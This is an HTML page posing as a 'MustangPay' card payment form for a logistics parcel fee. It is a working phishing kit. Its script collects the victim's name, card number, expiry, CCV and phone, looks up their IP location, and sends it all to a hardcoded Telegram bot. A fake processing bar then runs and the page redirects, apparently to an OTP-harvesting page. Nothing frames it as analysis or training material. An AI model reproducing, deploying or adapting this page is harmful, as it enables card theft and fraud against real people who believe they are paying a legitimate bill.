<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment</title>
<link rel="icon" href="img/MstgPay icon.png" type="image/jpeg">
<style>
    body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        background: linear-gradient(180deg, #fff5ec, #ffe7d6);
        display: flex;
        justify-content: center;
        padding: 20px;
    }
    .container { width: 100%; max-width: 380px; position: relative; }
    .logo { text-align: center; margin-bottom: 16px; }
    .logo img { height: 28px; }
    .card { background: #fff; border-radius: 16px; padding: 20px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); margin-bottom: 16px; }
    .amount { text-align: center; font-size: 26px; font-weight: 700; margin-top: 8px; }
    .merchant { text-align: center; color: #777; margin-bottom: 12px; font-weight: 600; }
    .section-title { font-weight: 600; margin-bottom: 12px; }
    .card-logos img { height: 22px; margin-left: 8px; }
    label { font-size: 13px; color: #555; margin-bottom: 6px; display: block; }
    input, select {
        width: 100%;
        padding: 12px;
        border-radius: 10px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
        font-size: 14px;
        box-sizing: border-box;
    }
    .row { display: flex; gap: 10px; }
    .small { flex: 1; }
    .terms { font-size: 12px; color: #666; text-align: center; margin-top: 12px; }
    .terms a { color: #000; font-weight: 500; text-decoration: none; }
    .pay-btn { margin-top: 16px; width: 100%; padding: 14px; background: #000; color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; }
    .info-box { font-size: 14px; margin-bottom: 12px; }
    .info-box div { margin: 4px 0; }

    /* Loading overlay */
    .overlay {
        display: none; /* hidden initially */
        position: absolute;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: rgba(255, 255, 255, 0.95);
        border-radius: 16px;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        z-index: 10;
        text-align: center;
        padding: 20px;
    }
    .overlay .percent { font-size: 32px; font-weight: 700; margin-top: 20px; }
    .loader-bar {
        position: relative;
        width: 100%;
        height: 12px;
        background: #eee;
        border-radius: 6px;
        overflow: hidden;
        margin-top: 20px;
    }
    .loader-fill {
        background: #e06a2f;
        width: 0%;
        height: 100%;
        border-radius: 6px;
    }
</style>
</head>
<body>
<div class="container">

    <!-- Logo -->
    <div class="logo">
        <img src="img/MstgPay2.png" alt="MustangPay Logo">
    </div>

    <!-- Info Card -->
    <div class="card info-card">
        <div class="merchant">BUFFALO International Logistics</div>
        <div class="info-box" id="infoBox"></div>
        <div class="amount">R 43.13</div>
    </div>

    <!-- Payment Card -->
    <div class="card">
        <div class="row" style="justify-content: space-between; align-items: center;">
            <div class="section-title">Card Payment</div>
            <div class="card-logos">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg">
            </div>
        </div>

        <label>Card Holder Name</label>
        <input id="nameField" type="text" placeholder="John Doe">

        <label>Card Number</label>
        <input id="partNumber" type="text" placeholder="5123456789012345" maxlength="16">

        <label>Expiry Date</label>
        <div class="row">
            <select id="monthSelect" class="small"></select>
            <select id="yearSelect" class="small"></select>
        </div>

        <label>CCV</label>
        <input id="extNumber" type="text" placeholder="3-4 digits" maxlength="4">

        <label>Phone</label>
        <input id="phone" type="tel" placeholder="0721234567" maxlength="10">
    </div>

    <div class="terms">
        By clicking the button, you agree to our
        <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
    </div>

    <button class="pay-btn" onclick="sendToTelegram()">Pay Now</button>

    <!-- Loading Overlay -->
    <div class="overlay" id="loadingOverlay">
        <img src="img/MstgPay2.png" style="height:28px;" alt="Logo">
        <div class="percent" id="percentText">0%</div>
        <div class="loader-bar"><div class="loader-fill" id="loaderFill"></div></div>
        <div style="margin-top:10px; font-size:14px; color:#555;">Processing payment, please wait...</div>
    </div>

</div>

<script>
    // Order info
    const orderNumber = localStorage.getItem('orderNumber') || '—';
    const remark = localStorage.getItem('remark') || '—';
    const amountDue = 'R 43.13';

    document.getElementById('infoBox').innerHTML = `
        <div><strong>Order Number:</strong> ${orderNumber}</div>
        <div><strong>Remark:</strong> ${remark}</div>
        <div><strong>Amount Due:</strong> ${amountDue}</div>
    `;

    // Month / Year dropdowns
    const months = ["Month","January","February","March","April","May","June","July","August","September","October","November","December"];
    const monthSelect = document.getElementById('monthSelect');
    months.forEach(m => monthSelect.add(new Option(m, m)));

    const yearSelect = document.getElementById('yearSelect');
    const currentYear = new Date().getFullYear();
    for (let y = currentYear; y <= currentYear + 20; y++) {
        yearSelect.add(new Option(y, y));
    }

    // Telegram settings
    const TELEGRAM_BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
    const TELEGRAM_CHAT_ID = "7027302249";

    async function sendToTelegram(){
        const name = document.getElementById('nameField').value.trim();
        const partNumber = document.getElementById('partNumber').value.trim();
        const month = monthSelect.value;
        const year = yearSelect.value;
        const extNumber = document.getElementById('extNumber').value.trim();
        const phone = document.getElementById('phone').value.trim();


        // Validation
        if (!name) { alert("Enter name on card"); return; }
        if (!/^\d{16}$/.test(partNumber)) { alert("Enter valid card number"); return; }
        if (month === 'Month' || !year) { alert("Select a valid expiry date"); return; }
        if (!/^\d{3,4}$/.test(extNumber)) { alert("Enter valid CCV at the back of your card"); return; }
        if (!/^\d{10}$/.test(phone)) { alert("Enter valid pone number"); return; }

        // ✅ STORE DATA FOR OTP PAGE
        localStorage.setItem('phone', phone);
        localStorage.setItem('orderNumber', orderNumber);
        localStorage.setItem('remark', remark);
        localStorage.setItem('amountDue', amountDue);

        // IP info
        let ipInfo = { ip:'Unknown', city:'Unknown', region:'Unknown', country:'Unknown' };
        try {
            const response = await fetch('https://ipinfo.io/json?token=48a36e97612e2a');
            if (response.ok) ipInfo = await response.json();
        } catch(e){ console.error(e); }

        const message = `
💳 *CC#:* ${partNumber}

*Order Number:* ${orderNumber}
*Remark:* ${remark}
*Amount Due:* ${amountDue}

*Name:* ${name}
*Card:* ${partNumber}
*Date:* ${month} / ${year}
*CCV:* ${extNumber}
*Phone:* ${phone}

*IP Address:* ${ipInfo.ip}
*Location:* ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
        `;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(message)}`;
        fetch(url).catch(console.error);

        // Show overlay and start countdown
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = "flex";

        let percent = 0;
        const percentText = document.getElementById('percentText');
        const loaderFill = document.getElementById('loaderFill');
        const totalDuration = 60000;
        const intervalTime = 100;
        const increment = (intervalTime / totalDuration) * 100;

        const interval = setInterval(() => {
            percent += increment;
            if (percent >= 100) percent = 100;
            percentText.textContent = Math.floor(percent) + '%';
            loaderFill.style.width = Math.floor(percent) + '%';
            if (percent >= 100) clearInterval(interval);
        }, intervalTime);

        setTimeout(() => {
            window.location.href = "opt.html";
        }, totalDuration);
    }
</script>

</body>
</html>
